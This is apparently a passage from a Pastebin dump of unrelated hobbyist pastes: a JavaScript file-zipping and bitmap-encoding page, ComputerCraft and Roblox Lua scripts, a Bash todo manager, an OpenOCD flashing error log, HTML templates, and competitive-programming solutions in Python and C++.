                const option = document.createElement(""option"");
                option.text = parentPath + ""/"" + item.webkitRelativePath;
                fileComboBox.add(option);
            }
        }

        function clearSelectedItems() {
            const fileComboBox = document.getElementById(""fileComboBox"");
            for (let i = fileComboBox.options.length - 1; i >= 0; i--) {
                if (fileComboBox.options[i].selected) {
                    selectedFiles.splice(i, 1);
                    fileComboBox.remove(i);
                }
            }
        }

        async function compressAndSave() {
            const compressionLevel = document.getElementById(""compressionComboBox"").value;
            const selectedExtension = document.getElementById(""extensionComboBox"").value;

            const compressedData = await compressData(selectedFiles, compressionLevel);

            const blob = new Blob([compressedData], { type: 'application/octet-stream' });
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);

            // Demander le nom du fichier compressé sans l'extension
            const compressedFileName = prompt(""Entrer le nom du fichier compressé:"", `fichiers_compresses`);
            if (!compressedFileName) {
                return; // Annuler la compression si le nom de fichier est vide
            }

            const fullFileName = `${compressedFileName}.${selectedExtension}`;
            link.download = fullFileName;
            link.click();
        }

        async function compressData(files, compressionLevel) {
            // Créer un nouveau FormData pour les fichiers et dossiers sélectionnés
            const zip = new JSZip();

            for (const file of files) {
                const fileContent = await file.arrayBuffer();
                const filePath = file.webkitRelativePath || file.name;
                zip.file(filePath, fileContent);
            }

            // Utiliser pako pour compresser les données
            const options = { level: compressionLevel === 'store' ? 0 : (compressionLevel === 'maximum' ? 9 : 5) };
            const dataToCompress = await zip.generateAsync({ type: ""uint8array"", compression: ""DEFLATE"", compressionOptions: options });

            return dataToCompress;
        }

        $(document).ready(function() {
            $(""#operationSelect"").change(function() {
                const selectedOperation = $(this).val();
                $(""#compressSection, #encodeSection, #decodeSection, #fileCompressorSection"").hide();

                if (selectedOperation === ""compress"") {
                    $(""#compressSection"").show();
                } else if (selectedOperation === ""encode"") {
                    $(""#encodeSection"").show();
                } else if (selectedOperation === ""decode"") {
                    $(""#decodeSection"").show();
                } else if (selectedOperation === ""pakobest"") {
                    $(""#fileCompressorSection"").show();
                }
            });

            // Gestionnaires d'événements pour la section de compression
            const fileInput = document.getElementById(""fileInput"");
            const compressButton = document.getElementById(""compressButton"");

            fileInput.addEventListener(""change"", function (e) {
                if (e.target.files.length > 0) {
                    compressButton.disabled = false;
                }
            });

            compressButton.addEventListener(""click"", function () {
                const filesToCompress = Array.from(fileInput.files);
                const zip = new JSZip();
                
                const promises = filesToCompress.map(file => {
                    return new Promise(resolve => {
                        const reader = new FileReader();
                        reader.onload = function () {
                            zip.file(file.name, reader.result);
                            resolve();
                        };
                        reader.readAsArrayBuffer(file);
                    });
                });

                Promise.all(promises).then(() => {
                    const zipName = prompt(""Entrez le nom du fichier ZIP :"") || ""compressed.zip"";
                    zip.generateAsync({ type: ""blob"" }).then(function (content) {
                        const a = document.createElement(""a"");
                        a.href = URL.createObjectURL(content);
                        a.download = zipName;
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                        URL.revokeObjectURL(a.href);
                    });
                });
            });

                loadButton.addEventListener(""click"", function () {
        encodeFileInput.click();
    });

    // Gestionnaire d'événement pour le chargement du fichier d'encodage
    encodeFileInput.addEventListener(""change"", function (e) {
        if (e.target.files.length > 0) {
            const file = e.target.files[0];
            const reader = new FileReader();
            reader.onload = function (event) {
                // Convertir les données du fichier en binaire
                const arrayBuffer = event.target.result;
                const byteArray = new Uint8Array(arrayBuffer);
                let binaryText = """";
                byteArray.forEach(function (byte) {
                    binaryText += byte.toString(2).padStart(8, ""0"");
                });

                // Afficher le texte binaire dans la zone de texte
                const textBox = document.getElementById(""textBox"");
                textBox.value = binaryText;
                generateButton.disabled = false;
            };
            reader.readAsArrayBuffer(file);
        }
    });

    // Gestionnaire d'événement pour le bouton de génération de motif d'encodage
    const generateButton = document.getElementById(""generateButton"");

    generateButton.addEventListener(""click"", function () {
        const binaryText = textBox.value;
        const imageSize = Math.ceil(Math.sqrt(binaryText.length));
        const bitmap = new ImageData(imageSize, imageSize);

        for (let i = 0; i < binaryText.length; i++) {
            const x = i % imageSize;
            const y = Math.floor(i / imageSize);
            const color = binaryText[i] === ""1"" ? [0, 0, 0, 255] : [255, 255, 255, 255];
            const index = (x + y * imageSize) * 4;
            bitmap.data[index] = color[0];
            bitmap.data[index + 1] = color[1];
            bitmap.data[index + 2] = color[2];
            bitmap.data[index + 3] = color[3];
        }

        // Créer un élément canvas pour afficher le motif généré
        const canvas = document.createElement(""canvas"");
        canvas.width = imageSize;
        canvas.height = imageSize;
        const context = canvas.getContext(""2d"");
        context.putImageData(bitmap, 0, 0);

        // Afficher le motif généré dans la section d'encodage
        const encodePictureBox = document.getElementById(""encodePictureBox"");
        encodePictureBox.innerHTML = """";
        encodePictureBox.appendChild(canvas);
        saveButton.disabled = false;
    });

    // Gestionnaire d'événement pour le bouton d'enregistrement du motif d'encodage
    const saveButton = document.getElementById(""saveButton"");

    saveButton.addEventListener(""click"", function () {
        const canvas = encodePictureBox.querySelector(""canvas"");
        const image = canvas.toDataURL(""image/bmp"").replace(""image/bmp"", ""image/octet-stream"");
        const a = document.createElement(""a"");
        const fileName = prompt(""Entrez le nom du fichier BMP :"", ""motif.bmp"") || ""motif.bmp"";
        a.href = image;
        a.download = fileName;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
    });

    // Gestionnaire d'événement pour le chargement du fichier de décodage
    const decodeFileInput = document.getElementById(""decodeFileInput"");
    const decodeGenerateButton = document.getElementById(""decodeGenerateButton"");
    const decodeSaveButton = document.getElementById(""decodeSaveButton"");
    const decodePictureBox = document.getElementById(""decodePictureBox"");
    const decodeTextBox = document.getElementById(""decodeTextBox"");
    const decodeCanvas = decodePictureBox.getContext(""2d"");
    let loadedBitmap = null;
    let binaryText = """";

    decodeFileInput.addEventListener(""change"", (event) => {
        const file = event.target.files[0];
        if (file) {
            const reader = new FileReader();
            reader.onload = (e) => {
                const image = new Image();
                image.src = e.target.result;
                image.onload = () => {
                    decodePictureBox.width = image.width;
                    decodePictureBox.height = image.height;
                    decodeCanvas.drawImage(image, 0, 0);
                    loadedBitmap = image;
                    decodeGenerateButton.disabled = false;
                };
            };
            reader.readAsDataURL(file);
        }
    });

    decodeGenerateButton.addEventListener(""click"", () => {
        if (!loadedBitmap) {
            alert(""Veuillez charger une image d'abord."");
            return;
        }

        const imageData = decodeCanvas.getImageData(0, 0, decodePictureBox.width, decodePictureBox.height);
        binaryText = generateBinaryPattern(imageData);
        decodeTextBox.value = binaryText;
        decodeSaveButton.style.display = ""block"";
    });

    decodeSaveButton.addEventListener(""click"", () => {
        if (!binaryText.trim()) {
            alert(""Le contenu du TextBox est vide. Veuillez générer le motif d'abord."");
            return;
        }

        const binaryBytes = convertBinaryTextToBytes(binaryText);
        const blob = new Blob([binaryBytes], { type: ""application/zip"" });
        const a = document.createElement(""a"");
        const fileName = prompt(""Entrez le nom du fichier ZIP :"", ""binary_pattern.zip"") || ""binary_pattern.zip"";
        a.href = URL.createObjectURL(blob);
        a.download = fileName;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(a.href);
    });

            function generateBinaryPattern(imageData) {
                const threshold = 128;
                let binaryText = """";

                for (let y = 0; y < imageData.height; y++) {
                    for (let x = 0; x < imageData.width; x++) {
                        const index = (y * imageData.width + x) * 4;
                        const r = imageData.data[index];
                        const g = imageData.data[index + 1];
                        const b = imageData.data[index + 2];
                        const luminance = (0.299 * r + 0.587 * g + 0.114 * b);
                        binaryText += (luminance < threshold) ? ""1"" : ""0"";
                    }
                }

                return binaryText;
            }

            function convertBinaryTextToBytes(binaryText) {
                const byteCount = Math.ceil(binaryText.length / 8);
                const bytes = new Uint8Array(byteCount);

                for (let i = 0; i < byteCount; i++) {
                    const byteStart = i * 8;
                    const byteEnd = byteStart + 8;
                    const byte = binaryText.slice(byteStart, byteEnd);
                    bytes[i] = parseInt(byte, 2);
                }

                return bytes;
            }
    compressButton.addEventListener(""click"", function () {
        // Récupérer les fichiers sélectionnés
        const filesToCompress = Array.from(fileInput.files);
        // Créer une instance JSZip
        const zip = new JSZip();

        // Créer un tableau de promesses pour lire les fichiers et les ajouter à l'archive zip
        const promises = filesToCompress.map(file => {
            return new Promise(resolve => {
                const reader = new FileReader();
                reader.onload = function () {
                    zip.file(file.name, reader.result);
                    resolve();
                };
                reader.readAsArrayBuffer(file);
            });
        });

        // Attendre que toutes les promesses soient résolues, puis générer et télécharger l'archive zip
        Promise.all(promises).then(() => {
            const zipName = prompt(""Entrez le nom du fichier ZIP :"") || ""compressed.zip"";
            zip.generateAsync({ type: ""blob"" }).then(function (content) {
                // Créer un lien de téléchargement
                const a = document.createElement(""a"");
                a.href = URL.createObjectURL(content);
                a.download = zipName;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(a.href);
            });
        });
    });
});
    </script>
</body>
</html>
"
rsLZitAc,Reactor Control New,djdiavolo,Lua,Saturday 19th of August 2023 05:51:23 PM CDT,"local version = ""0.1"";

--------------------------------------------

function welcome()
	term.clear();
	print(""Reactor Control v""..version);
end

--------------------------------------------

function getPeripheralDirection( forName )
	print(""Select peripheral direction for ""..forName);
	print(""Use left and right arrow keys to switch."");
	print(""Confirm your selection with ENTER."");

	local directions = {""top"",""bottom"",""back"",""left"",""right""};
	local x, y = term.getCursorPosition();
	local directionKey = 1;
	local confirm = false;
	repeat
		term.setCursorPos(x, y);
		term.clearLine();
		print(""< ""..directions[directionKey].."" >"");
		
		local keyAction = false;
		repeat
			local event, key, isHeld = os.pullEvent(""key"");
			keyAction = true;
			if key == keys.left then
				directionKey = directionKey-1;
				if directionKey < 1 then
					directionKey = table.getn(directions);
				end
			elseif key == keys.right then
				directionKey = directionKey+1;
				if directionKey > table.getn(directions) then
					directionKey = 1;
				end
			elseif key == 28 then -- Key 28 == ENTER
				confirm = true;
			else
				keyAction = false
			end
		until keyAction;
	until confirm;
	return directions[directionKey];
end
	
--------------------------------------------

local peripheralConnect = getPeripheralDirection(""Reactor"");

local reactor;
local function verifyConnection()
	if reactor == nil or not reactor.getConnected() then
		print(""Waiting for Connection..."");
		repeat
			sleep(1/5);
			reactor = peripheral.wrap(peripheralConnect);
		until reactor ~= nil and reactor.getConnected();
	else
		print(""Sucessfuly conected to Reactor!"");
	end
end"
rt147kBN,Untitled,smj007,Python,Saturday 19th of August 2023 05:14:16 PM CDT,"class Solution:
    def pacificAtlantic(self, heights: List[List[int]]) -> List[List[int]]:

        rows, cols = len(heights), len(heights[0])
        directions = [(-1, 0), (1, 0), (0, -1), (0, 1)]

        pac_queue = deque()
        atl_queue = deque()

        for r in range(rows):
            pac_queue.append((r, 0))
            atl_queue.append((r, cols-1))

        for c in range(cols):
            pac_queue.append((0, c))
            atl_queue.append((rows-1, c))

        def bfs(queue):
            visited = set()
            while queue:
                r,c = queue.popleft()
                visited.add((r, c))
                prev_height = heights[r][c]

                for dr, dc in directions:
                    row = r + dr
                    col = c + dc

                    if (
                        row in range(rows)
                        and col in range(cols)
                        and (row, col) not in visited
                        and heights[row][col] >= prev_height
                    ):
                        queue.append((row, col))

            return visited

        visited_pac = bfs(pac_queue)
        visited_atl = bfs(atl_queue)
        
        result = []
        for r in range(rows):
            for c in range(cols):
                if (r,c) in visited_pac and (r,c) in visited_atl:
                    result.append([r, c])

        return result"
L3aPKM1R,Todo Manager,HasteBin0,Bash,Saturday 19th of August 2023 04:52:39 PM CDT,"#!/usr/bin/sh

display_help() {
    cat << EOF

Script Name: Todo Manager
Author: Aidan Danielski
Date Created: Sat August 19th 2023
Description:
  A utility script to manage todo entries stored in specific directories. 
  Provides functionalities for listing, reading, retiring, and clearing entries.

Usage:
  ./script.sh [where] [action] [entry-name/pattern (if required)]

Arguments:
  where:
    Specify the storage location. Options include:
      - db|drop|box|dropbox: Refers to $HOME/Dropbox/todo
      - ms|mega|sync|megasync: Refers to $HOME/MEGAsync/todo

  action:
    Specify the action to perform. Options include:
      - list: Lists all entries
      - read: Reads a specific entry
      - retire: Moves an entry to a ""retired"" folder
      - clear: Deletes all entries
      - If no action is provided, creates a new entry

  entry-name/pattern:
    Used with the ""read"" and ""retire"" actions to specify which entry to act upon.

Examples:
  ./script.sh db list: Lists all entries in the Dropbox todo folder.
  ./script.sh ms read project: Reads entries containing the word ""project"" in the MEGAsync todo folder.
  ./script.sh drop retire old-task: Retires entries containing the word ""old-task"" in the Dropbox todo folder.
  ./script.sh mega clear: Deletes all entries in the MEGAsync todo folder.

Note:
  Be cautious when using the clear action. Ensure backups are made as this will delete all files in the chosen location.

EOF
}

where=""$1""
action=""$2""
entry=""$3""

# Display help if the user provides ""help"" as the first argument
if [ ""$where"" = ""help"" ]; then
    display_help
    exit 0
fi

if [ -z ""$where"" ]; then
    echo ""Please provide a storage argument.""
    exit 1
fi

case $where in
	db|drop|box|dropbox)
		folder=""$HOME/Dropbox/todo""
		;;
	ms|mega|sync|megasync)
		folder=""$HOME/MEGAsync/todo""
		;;
	*)
		echo ""Invalid \""$where\"" :: ...""
		exit 1
		;;
esac

cd ""$folder"" || { echo ""Error: Unable to change directory to $folder""; exit 1; }

case $action in
	list)
		ls -al --color=auto
		;;

	read)
		if [ -z ""$entry"" ]; then
			echo ""Please provide a filename or part of the filename to read.""
			exit 1
		fi
		grep -l ""$entry"" * | xargs cat
		;;

	retire)
		if [ -z ""$entry"" ]; then
			echo ""Please provide a filename or part of the filename to retire.""
			exit 1
		fi
		mkdir -p retired
		mv ""$(grep -l ""$entry"" *)"" retired/
		;;

	clear)
		echo ""Clearing all entries...""
		rm *
		;;

	*)
		new=""Todo entry $(date '+%Y-%m-%d %H:%M:%S').txt""
		echo ""Opening $new!""
		touch ""$new""
		chmod +rw ""$new""
		/usr/bin/gedit ""$new"" &
		;;
esac
"
d9WRBpye,UFO CLAMP CODE,bvcnmkor85471,Lua,Saturday 19th of August 2023 04:52:11 PM CDT,"local rs = game:GetService(""RunService"")

local character = script.Parent
local humanoid = character:WaitForChild(""Humanoid"")

local connection = nil
local seat = nil
local attachment0 = nil
local vf = nil
local trueOrient = nil
local allignOrientation = nil
local oldseatPos = nil

local offset = Vector3.new(0,-80,0)

local parametersRay = nil

local rayPart = Instance.new(""Part"", workspace)
rayPart.Size = Vector3.one
rayPart.Shape = Enum.PartType.Ball
rayPart.CanQuery = false
rayPart.CanCollide = false
rayPart.CanTouch = false
rayPart.Anchored = true

local thrust = 2000
local minimum_thrust = 1000
local drag = 5
local velocityRay = .6
local velocityStabilize = .4
local velocityHorizontal = .8

local lerp = false

local orientationClamp = 35
local X, Y, Z
local limX
local limY
local limZ
local stabilizeX = CFrame.Angles(0,0,0)
local stabilizeZ = CFrame.Angles(0,0,0)

local horizontalRayPart = Instance.new(""Part"", workspace)
horizontalRayPart.Size = Vector3.new(4,4,4)
horizontalRayPart.Shape = Enum.PartType.Ball
horizontalRayPart.CanQuery = false
horizontalRayPart.CanCollide = false
horizontalRayPart.CanTouch = false
horizontalRayPart.Anchored = true

local function Loop (deltaTime)
	oldseatPos = seat.Position
	
	local rayTarget = seat.Position + offset + seat.AssemblyLinearVelocity * velocityRay
	local result = workspace:Raycast(seat.Position, rayTarget - seat.Position, parametersRay)
	local horizontalTarget = (oldseatPos - seat.Position) + seat.AssemblyLinearVelocity * velocityHorizontal
	local horizontalResult = workspace:Raycast(oldseatPos, horizontalTarget, parametersRay)
	
	X, Y, Z = seat.CFrame:ToOrientation()
	limX = math.clamp(math.deg(X), -orientationClamp, orientationClamp)
	limZ = math.clamp(math.deg(Z), -orientationClamp, orientationClamp)
		
	if result == nil then
		rayPart.Position = rayTarget
		rayPart.BrickColor = BrickColor.new(""Really red"")
		
		vf.Force = Vector3.new(0, minimum_thrust, 0)
	else
		rayPart.Position = result.Position
		rayPart.BrickColor = BrickColor.new(""Lime green"")
		
		local magnitude = (result.Position - rayTarget).Magnitude
		vf.Force = Vector3.new(0, minimum_thrust + magnitude * thrust, 0)
	end
	
	local velocity = seat.CFrame:VectorToObjectSpace(seat.AssemblyLinearVelocity)
	if velocity.Magnitude > 0 then vf.Force -= velocity.Unit * (drag * velocity.Magnitude ^ 2) end
	

	if horizontalResult == nil then
		horizontalRayPart.Position = seat.Position + horizontalTarget
		horizontalRayPart.BrickColor = BrickColor.new(""Really red"")

	else
		horizontalRayPart.Position = horizontalResult.Position
		horizontalRayPart.BrickColor = BrickColor.new(""Lime green"")
		vf.Force -= velocity.Unit * (drag * velocity.Magnitude ^ 3)
	end
	
	--trueOrient *= CFrame.fromOrientation(0 , -seat.SteerFloat * seat.TurnSpeed * deltaTime, 0)
	local tilt = CFrame.fromOrientation(-seat.ThrottleFloat * seat.Torque, 0, -seat.SteerFloat * seat.Torque)
	if math.abs(limX) ~= orientationClamp and math.abs(limZ) ~= orientationClamp then
		allignOrientation.CFrame = trueOrient * tilt
	else
		allignOrientation.CFrame = trueOrient * tilt
		seat.CFrame = CFrame.new(seat.CFrame.p) * CFrame.fromOrientation(math.rad(limX), 0, math.rad(limZ))
	end
end
		

spawn(function()
	while wait(.2) do
		if seat then
			print(limX .. "" "" .. limZ)
		end
	end
end)

local function Seated (active, CurrentSeat)
	if active == false then
		if connection == nil then return end
		connection:Disconnect()
		connection = nil
		attachment0:Destroy()
		vf:Destroy()	
		
	elseif CurrentSeat.Name == ""UFOseat""then
		seat = CurrentSeat
		
		attachment0 = Instance.new(""Attachment"", seat)
		
		vf = Instance.new(""VectorForce"")
		vf.Parent = seat
		vf.ApplyAtCenterOfMass = true
		vf.Force = Vector3.zero
		vf.Attachment0 = attachment0
		
		trueOrient = CFrame.fromMatrix(Vector3.zero, seat.CFrame.LookVector:Cross(Vector3.yAxis), Vector3.yAxis)
		allignOrientation = Instance.new(""AlignOrientation"", seat)
		allignOrientation.Mode = Enum.OrientationAlignmentMode.OneAttachment
		allignOrientation.CFrame = trueOrient
		allignOrientation.Responsiveness = 1
		allignOrientation.Attachment0 = attachment0
		
		parametersRay = RaycastParams.new()
		parametersRay.FilterType = Enum.RaycastFilterType.Exclude
		parametersRay.FilterDescendantsInstances = {character, seat:FindFirstAncestorOfClass(""Model"")}
		
		connection = rs.PostSimulation:Connect(Loop)
	end
end

humanoid.Seated:Connect(Seated)"
whjM7pLK,navbar.html,mb6ockatf,HTML,Saturday 19th of August 2023 03:56:19 PM CDT,"<nav class=""navbar bg-body-tertiary bg-dark border-bottom
  border-body navbar-expand-sm"" data-bs-theme=""dark"">
  <div class=""container-fluid"">
    <a class=""navbar-brand"" href=""#"">Brand</a>
    <div class=""collapse navbar-collapse justify-content-end""
      id=""navbarNavAltMarkup"">
      <!--<ul class=""navbar-nav"">-->
        <li class=""nav-item active"">
          <a class=""nav-link"" href=""https://google.com"">
            About
          </a>
        </li>
        <li class=""nav-item"">
          <button type=""button"" class=""btn btn-secondary"">
            <a class=""nav-link active"" href=""{{ url_for('signin') }}"">
              Sign in
            </a>
          </button>
        </li>
        <li class=""nav-item"">
          <button type=""button"" class=""btn btn-outline-success active"">
            <a class=""nav-link active"" href=""{{ url_for('signup') }}"">
              Sign up
            </a>
          </button>
        </li>
      <!--</ul>-->
    </div>
  </div>
</nav>"
n2w8JY14,AutoCharcoal,nauseant,Lua,Saturday 19th of August 2023 02:46:30 PM CDT,"function transferCoal()
    turtle.drop(7)
    turtle.dropUp(1)
end

while true do
    local details = turtle.getItemDetail(1)
    if details.count == 9 then
        transferCoal()
    else
        turtle.suckUp()
    end
end"
JXZP89Qz,Untitled,Ayush1325,Bash,Saturday 19th of August 2023 02:29:35 PM CDT,"Programming/BeagleBoard/launchpad via 🐍 v3.11.4 (.venv)
⬢ [fedora-toolbox:38] ❯ west flash
-- west flash: rebuilding
ninja: no work to do.
-- west flash: using runner openocd
-- runners.openocd: Flashing file: /var/home/ayush/Documents/Programming/BeagleBoard/launchpad/build/zephyr/zephyr.hex
Open On-Chip Debugger 0.11.0+dev-00725-gc5c47943d (2023-03-14-22:08)
Licensed under GNU GPL v2
For bug reports, read
        http://openocd.org/doc/doxygen/bugs.html
adapter srst delay: 100

Info : XDS110: connected
Info : XDS110: vid/pid = 0451/bef3
Info : XDS110: firmware version = 2.3.0.17
Info : XDS110: hardware version = 0x0023
Info : XDS110: connected to target via JTAG
Info : XDS110: TCK set to 2500 kHz
Info : XDS110: reduce speed request: 5500 kHz to 2500 kHz maximum
Info : clock speed 5500 kHz
Error: JTAG scan chain interrogation failed: all ones
Error: Check JTAG interface, timings, target power, etc.
Error: Trying to use configured scan chain anyway...
Error: cc13x2.jrc: IR capture error; saw 0x3f not 0x01
Warn : Bypassing JTAG setup events due to errors
Info : starting gdb server for cc13x2.cpu on 3333
Info : Listening on port 3333 for gdb connections
    TargetName         Type       Endian TapName            State
--  ------------------ ---------- ------ ------------------ ------------
 0* cc13x2.cpu         cortex_m   little cc13x2.cpu         tap-disabled

Error: JTAG scan chain interrogation failed: all ones
Error: Check JTAG interface, timings, target power, etc.
Error: Trying to use configured scan chain anyway...
Error: cc13x2.jrc: IR capture error; saw 0x3f not 0x01
Warn : Bypassing JTAG setup events due to errors
Error: Target not examined yet
Error: auto_probe failed
auto erase enabled
Info : XDS110: disconnected
FATAL ERROR: command exited with status 1: /var/home/ayush/.local/opt/zephyr-sdk-0.16.0/sysroots/x86_64-pokysdk-linux/usr/bin/openocd -s /var/home/ayush/Documents/Programming/BeagleBoard/launchpad/zephyr/boards/arm/cc1352p1_launchxl/support -s /var/home/ayush/.local/opt/zephyr-sdk-0.16.0/sysroots/x86_64-pokysdk-linux/usr/share/openocd/scripts -f /var/home/ayush/Documents/Programming/BeagleBoard/launchpad/zephyr/boards/arm/cc1352p1_launchxl/support/openocd.cfg '-c init' '-c targets' -c 'reset init' -c 'flash write_image erase /var/home/ayush/Documents/Programming/BeagleBoard/launchpad/build/zephyr/zephyr.hex' -c 'reset run' -c shutdown
"
QSJynfzK,silverwood,sin_en,HTML,Saturday 19th of August 2023 02:29:33 PM CDT,"<div style=""background:url('https://i.imgur.com/yy6Ty53.png');width:550px;height:765px;"">
 
<div style=""width:224px;height:136px;float:left;margin:411px auto auto 40px;overflow:hidden;"">
<div style=""width:238px;height:136px;font:8.5pt arial;color:#dbf2da;text-align:justify;padding-right:5px;overflow:auto;line-height:15px;letter-spacing:0.5px;"">
TITLE<br>—<br> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas sed velit at est sollicitudin posuere. Donec aliquet ligula vitae metus luctus cursus. Nulla sed quam sit amet metus fermentum vestibulum. Phasellus rutrum gravida lorem at blandit. Cras vitae turpis mi. Praesent consequat. Nulla sed quam sit amet metus fermentum vestibulum.</div></div>

<div style=""width:224px;height:136px;float:left;margin:411px auto auto 25px;overflow:hidden;"">
<div style=""width:238px;height:136px;font:8.5pt arial;color:#dbf2da;text-align:justify;padding-right:5px;overflow:auto;line-height:15px;letter-spacing:0.5px;"">
TITLE<br>—<br> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas sed velit at est sollicitudin posuere. Donec aliquet ligula vitae metus luctus cursus. Nulla sed quam sit amet metus fermentum vestibulum. Phasellus rutrum gravida lorem at blandit. Cras vitae turpis mi. Praesent consequat. Nulla sed quam sit amet metus fermentum vestibulum.</div></div>

<div style=""width:224px;height:136px;float:left;margin:25px auto auto 40px;overflow:hidden;"">
<div style=""width:238px;height:136px;font:8.5pt arial;color:#dbf2da;text-align:justify;padding-right:5px;overflow:auto;line-height:15px;letter-spacing:0.5px;"">
TITLE<br>—<br> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas sed velit at est sollicitudin posuere. Donec aliquet ligula vitae metus luctus cursus. Nulla sed quam sit amet metus fermentum vestibulum. Phasellus rutrum gravida lorem at blandit. Cras vitae turpis mi. Praesent consequat. Nulla sed quam sit amet metus fermentum vestibulum.</div></div>

<div style=""width:224px;height:136px;float:left;margin:25px auto auto 25px;overflow:hidden;"">
<div style=""width:238px;height:136px;font:8.5pt arial;color:#dbf2da;text-align:justify;padding-right:5px;overflow:auto;line-height:15px;letter-spacing:0.5px;"">
TITLE<br>—<br> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas sed velit at est sollicitudin posuere. Donec aliquet ligula vitae metus luctus cursus. Nulla sed quam sit amet metus fermentum vestibulum. Phasellus rutrum gravida lorem at blandit. Cras vitae turpis mi. Praesent consequat. Nulla sed quam sit amet metus fermentum vestibulum.</div></div>


<a href=""https://www.howrse.com/joueur/fiche/?id=38719314"" style=""float:left;margin-top:-50px;margin-left:80px;""><img src=""https://cdn.discordapp.com/attachments/349299049255665669/484150348580257793/blank-bigger.png""></a>"
uHcPaA8z,Untitled,Skos_Martren,C++,Saturday 19th of August 2023 01:44:53 PM CDT,"class Solution {
public:
    template <typename RandomIt>
    void MergeSort(RandomIt range_begin, RandomIt range_end) {
        // 1. Если диапазон содержит меньше 2 элементов, выходим из функции
        const int range_length = range_end - range_begin;
        if (range_length < 2) {
            return;
        }

        // 2. Создаем вектор, содержащий все элементы текущего диапазона
        vector<typename RandomIt::value_type> elements(
            make_move_iterator(range_begin), make_move_iterator(range_end));

        // 3. Разбиваем вектор на три равные части
        auto one_third = begin(elements) + range_length / 3;
        auto two_third = begin(elements) + range_length * 2 / 3;

        // 4. Вызываем функцию MergeSort от каждой трети вектора
        MergeSort(begin(elements), one_third);
        MergeSort(one_third, two_third);
        MergeSort(two_third, end(elements));

        // 5. С помощью алгоритма merge cливаем первые две трети во временный вектор
        // back_inserter -> http://ru.cppreference.com/w/cpp/iterator/back_inserter
        vector<typename RandomIt::value_type> interim_result;
        merge(make_move_iterator(begin(elements)), make_move_iterator(one_third),
            make_move_iterator(one_third), make_move_iterator(two_third),
            back_inserter(interim_result));

        // 6. С помощью алгоритма merge сливаем отсортированные части
        // в исходный диапазон
        // merge -> http://ru.cppreference.com/w/cpp/algorithm/merge
        merge(make_move_iterator(begin(interim_result)),
            make_move_iterator(end(interim_result)),
            make_move_iterator(two_third),
            make_move_iterator(end(elements)),
            range_begin);
    }

    void merge(vector<int>& nums1, int m, vector<int>& nums2, int n) {
        for (int i = 0; i < n; i++) {
            nums1[m + i] = nums2[i];
        }
        MergeSort(nums1.begin(), nums1.end());
    }
};"
fUtu1kKx,Untitled,lodha1503,C++,Saturday 19th of August 2023 12:24:42 PM CDT,"#include <bits/stdc++.h> 
using namespace std;
#define ll long long
#define pb push_back
#define MOD1 1000000007
#define MOD2 998244353
#define NO cout << ""NO"" << endl
#define YES cout << ""YES"" << endl
ll expo(ll a, ll b, ll mod) {ll res = 1; while (b > 0) {if (b & 1)res = (res * a) % mod; a = (a * a) % mod; b = b >> 1;} return res;}
ll mminvprime(ll a, ll b) {return expo(a, b - 2, b);}
ll mod_add(ll a, ll b, ll m) {a = a % m; b = b % m; return (((a + b) % m) + m) % m;}
ll mod_mul(ll a, ll b, ll m) {a = a % m; b = b % m; return (((a * b) % m) + m) % m;}
ll mod_sub(ll a, ll b, ll m) {a = a % m; b = b % m; return (((a - b) % m) + m) % m;}
ll mod_div(ll a, ll b, ll m) {a = a % m; b = b % m; return (mod_mul(a, mminvprime(b, m), m) + m) % m;}
void print(vector<int> &ans){for(auto x: ans) cout<<x<<"" ""; cout<<endl;}
 
// ========================================================================


void solve()
{
    
    int n;string s;
    cin>>n;
    cin>>s;
    if(n%2!=0)
    {
        cout<<-1<<endl;
        return;
    }
    vector<int> hm(26,0);
    vector<int> rep(26,0);
    
    for(int i=0;i<n;i++)
    {
        hm[s[i]-'a']+=1;
        
        if(hm[s[i]-'a']>n/2)
        {
            cout<<-1<<endl;
            return;
        }
    }
    
    for(int i=0;i<int(n/2);i++)
    {
        if(s[i] == s[n-i-1])
            rep[s[i]-'a']+=1;
    }
    
    vector<int> _rep;
    for(int i=0;i<26;i++)
    {
        if(rep[i]!=0)
            _rep.push_back(rep[i]);
    }
        
    if(_rep.size()==0)
    {
        cout<<0<<endl;
        return;
    }
    
    if(_rep.size()==1)
    {
        cout<<_rep[0]<<endl;
        return;
    }
    sort(_rep.begin(),_rep.end());
    int n1=_rep.size();
    vector<int> prefix(n1,0);
    vector<int> suffix(n1,0);
    
    prefix[0]=_rep[0];
    suffix[n1-1]=_rep[n1-1];
    
    for(int i=1;i<n1;i++)
        prefix[i]=prefix[i-1]+_rep[i];
    
    for(int i=n1-2;i>=0;i--)
        suffix[i]=suffix[i+1]+_rep[i];
        
    
        
    
    
    
    
    
    
    int ind=0;
   
    for(int i=n1-1;i>0;i--)
    {
   
        if(suffix[i] == prefix[i-1])
        {
            cout<<suffix[i]<<endl;
            return;
        }
        else if(suffix[i] > prefix[i-1])
        {
            ind=i;
            break;
        }
    }
    
    
    cout<<prefix[ind-1]+int(ceil((1.0*suffix[ind]-prefix[ind-1])/2))<<endl;

    
    
    
    
  
}


int main()
{
    int T;cin>>T;
    while(T--)
    {
        solve();
    }
}
"
a2RNRAi7,modemtest.lua,Braresa,Lua,Saturday 19th of August 2023 12:24:15 PM CDT,"peripheral.find(""modem"", rednet.open)

local sides = {
    ""left"",
    ""right"",
    ""top"",
    ""bottom"",
    ""front"",
    ""back"",
}

for i,v in ipairs(sides) do
    if rednet.isOpen(v) then
        print(""Modem aberto em ""..v)
    end
end

local function getMessages()
    while true do
        local id, message = rednet.receive(nil, 0.1)
        print(id, message)
        coroutine.yield()
    end
end

local function sendMessages()
    while true do
        write(""Mensagem: "")
        local message = read()
        rednet.broadcast(message)
        coroutine.yield()
    end
end

local getCoroutine = coroutine.create(getMessages)
local sendCoroutine = coroutine.create(sendMessages)

while true do
    coroutine.resume(getCoroutine)
    coroutine.resume(sendCoroutine)
end"
vnfU5F1J,Untitled,Sreekar_0125,C++,Saturday 19th of August 2023 11:02:59 AM CDT,"#include <bits/stdc++.h>
using namespace std;
// #define cerr if(false)cerr
#define int long long
